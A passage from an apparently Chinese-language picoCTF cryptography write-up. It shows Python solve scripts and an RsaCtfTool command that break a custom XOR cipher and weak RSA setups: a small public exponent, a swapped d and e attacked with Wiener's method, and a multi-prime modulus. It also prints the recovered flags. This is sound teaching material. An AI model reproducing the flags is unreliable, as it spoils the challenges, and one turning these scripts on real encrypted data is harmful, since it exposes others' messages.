<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假設題目的dynamic_xor_encrypt為f，明文為ABC</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">f(ABC, KEY) = C&#x27;B&#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">解密：</span><br><span class="line">第一次反轉，把C&#x27;B&#x27;A變為A&#x27;B&#x27;C，所以在f裡就會計算C&#x27;B&#x27;A對KEY的XOR</span><br><span class="line">f(A&#x27;B&#x27;C, KEY) = CBA</span><br><span class="line">第二次反轉，把CBA轉為ABC</span><br><span class="line">flag = ABC</span><br></pre></td></tr></table></figure>
<p>希望這樣解釋有比較清楚一點！總之照這樣解密就可以得到 flag 啦，以下是我的解密的代碼：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher: <span class="built_in">list</span>, key: <span class="built_in">int</span>, text_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    semi_cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> encrypted_value <span class="keyword">in</span> cipher:</span><br><span class="line">        decrypted_value = encrypted_value // (key * <span class="number">311</span>)  <span class="comment"># 使用 // 返回int</span></span><br><span class="line">        semi_cipher += <span class="built_in">chr</span>(decrypted_value)</span><br><span class="line">    semi_cipher = semi_cipher[::-<span class="number">1</span>]  <span class="comment"># 將密文反轉</span></span><br><span class="line">    plaintext = dynamic_xor_encrypt(semi_cipher, text_key)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">33588</span>,</span><br><span class="line">    <span class="number">276168</span>,</span><br><span class="line">    <span class="number">261240</span>,</span><br><span class="line">    <span class="number">302292</span>,</span><br><span class="line">    <span class="number">343344</span>,</span><br><span class="line">    <span class="number">328416</span>,</span><br><span class="line">    <span class="number">242580</span>,</span><br><span class="line">    <span class="number">85836</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">156744</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">309756</span>,</span><br><span class="line">    <span class="number">78372</span>,</span><br><span class="line">    <span class="number">18660</span>,</span><br><span class="line">    <span class="number">253776</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">82104</span>,</span><br><span class="line">    <span class="number">320952</span>,</span><br><span class="line">    <span class="number">3732</span>,</span><br><span class="line">    <span class="number">231384</span>,</span><br><span class="line">    <span class="number">89568</span>,</span><br><span class="line">    <span class="number">100764</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">    <span class="number">22392</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">190332</span>,</span><br><span class="line">    <span class="number">119424</span>,</span><br><span class="line">    <span class="number">182868</span>,</span><br><span class="line">    <span class="number">97032</span>,</span><br><span class="line">    <span class="number">26124</span>,</span><br><span class="line">    <span class="number">44784</span>,</span><br><span class="line">    <span class="number">63444</span>,</span><br><span class="line">]</span><br><span class="line">plaintext = decrypt(cipher, <span class="number">12</span>, <span class="string">&quot;trudeau&quot;</span>)  <span class="comment"># since we know the key is 12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plaintext is: <span class="subst">&#123;plaintext[::-<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;custom_d2cr0pt6d_dc499538&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mini-RSA">Mini RSA</h2>
<p>題目給了一組 RSA 加密的密文，還有公鑰（n, e），如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span><br></pre></td></tr></table></figure>
<p>不難發現，這題的公鑰指數 e 超小，只有 3。所以我們使用小公鑰指數攻擊（Coppersmith’s attack, Low public exponent attack）。由於題目有說<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup></mrow><annotation encoding="application/x-tex">m^e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span></span></span>略大於<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，故其解題原理如下（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>為密文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>為明文，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>是公鑰指數，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>是公鑰模數）：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c=m^e\mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>=</mo><mi>k</mi><mo>×</mo><mi>n</mi><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">m^e=k\times n+c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Bruteforce k and find the eth root of </mtext><mi>k</mi><mo>×</mo><mi>n</mi><mo>+</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">\text{Bruteforce k and find the eth root of }k\times n+c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord text"><span class="mord">Bruteforce k and find the eth root of </span></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p>
<p>為了計算明文，我寫了一個 Python 腳本，如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure>
<p>執行後就可以找到 flag 啦～</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702161343132.png" alt="Flag"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;e_sh0u1d_b3_lArg3r_7adb35b1&#125;</span><br></pre></td></tr></table></figure>
<h2 id="miniRSA">miniRSA</h2>
<p>這題的原理和上面那題一模一樣，都是 e 太小所以用小公鑰指數攻擊。想知道更詳細原理看<a target="_blank" rel="noopener" href="http://localhost:4000/CTF/All-in-One%20PicoCTF-Writeups/#Mini-RSA">上面那題</a>，這邊直接上 Exploit。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目所給的n, e, c</span></span><br><span class="line">n = <span class="number">29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141</span></span><br><span class="line"><span class="comment"># 暴力破解 k * n + c 的 e 次方根</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m, is_root = gmpy2.iroot(k * n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_root:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 數字轉字串</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;n33d_a_lArg3r_e_d0cd6eae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="b00tl3gRSA2">b00tl3gRSA2</h2>
<p>這題給了一個 Netcat 連接方式<code>nc jupiter.challenges.picoctf.org 57464</code>。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文 C。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600</span><br><span class="line">n: 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521</span><br><span class="line">e: 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973</span><br></pre></td></tr></table></figure>
<p>在題目的描述中他說：</p>
<blockquote>
<p>In RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e?</p>
</blockquote>
<p>意思是在這題裡面他把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span> 互換了，用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 來加密 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>。下面這篇文章有詳細說了為甚麼不應該使用這種做法。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt">RSA: Does it matter if you use e or d to encrypt?</a></li>
</ul>
<p>簡而言之，當私鑰指數（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>）比較小的時候，可以使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wiener%27s_attack">Wiener’s attack</a>。這邊可以使用一個開源工具來幫助我們快速執行攻擊。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></li>
</ul>
<p>使用方式請查看官方文檔。總之 Exploit 如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RsaCtfTool.py -e 37080866881034431981182406871995949206609767233841813908107646836499839869322256469420054910921271502986970536597423895034064361029486896285600240175045808110268909882526287214985406985265436522819284777174250321264328876332147142628536767687999620602780344780826878645902905435208326564999474536627301460973 -n 68119657260892882095325897664190568273401102037961904922092525598421583896728037063388427153386051029888075348478917163527609699475528597669779479757588723783858410926089233944915463760773669961431608182207070211704104302242228666666950454789023679482670607533342993172566630254264627616929496230133089420521 --decrypt 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600 --attack wiener</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707150749451.png" alt="Pwned!"></p>
<p>總之就是把參數都設定好，就可以成功得到 Flag 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;bad_1d3a5_2152720&#125;</span><br></pre></td></tr></table></figure>
<h2 id="b00tl3gRSA3">b00tl3gRSA3</h2>
<p>這題和上一題一樣，先用 Netcat 連線到主機，得到資訊如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span><br><span class="line">n: 3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure>
<p>題目說了</p>
<blockquote>
<p>Why use p and q when I can use more?</p>
</blockquote>
<p>意思是，這題的初始質數不只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>。所以我們只要找到歐拉函數 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，並且正常走流程就可以了。由於他不只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 兩個質數，分解起來會容易很多。Exploit 如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> factorint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phi</span>(<span class="params">n</span>):</span><br><span class="line">    f = factorint(n) <span class="comment"># 返回一個字典，key為質因數，value為該質因數的冪</span></span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> f.items():</span><br><span class="line">        phi *= <span class="built_in">pow</span>(a, b - <span class="number">1</span>) * (a - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 宣告題目給的資訊</span></span><br><span class="line">c = <span class="number">1155413374658603081887942538070618568058048531029758454280998255793925425541835159695263849863790503010031220771999047690488595295467625987010931696477313386062384452816188902386984531395080585643524053777943484599038478398898775019494628236550977835910935567524611329303821647514235510296512723444159728500460371101677191814101634547011569775</span></span><br><span class="line">n = <span class="number">3009815969095519381043948515174929441467634594821498333858615496361783804562611599728570248270874306617036697889577813844217713194056663725350522605669349001546826005570895246471872723077264759401472551915667965016802426155245585986786567513487278588996436597960321248870612409759311004096684257474660765774013406405351078796165091907796029759</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">phi = get_phi(n)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>這邊的<code>get_phi(n)</code>是用到了以下的求歐拉函數的公式：</p>
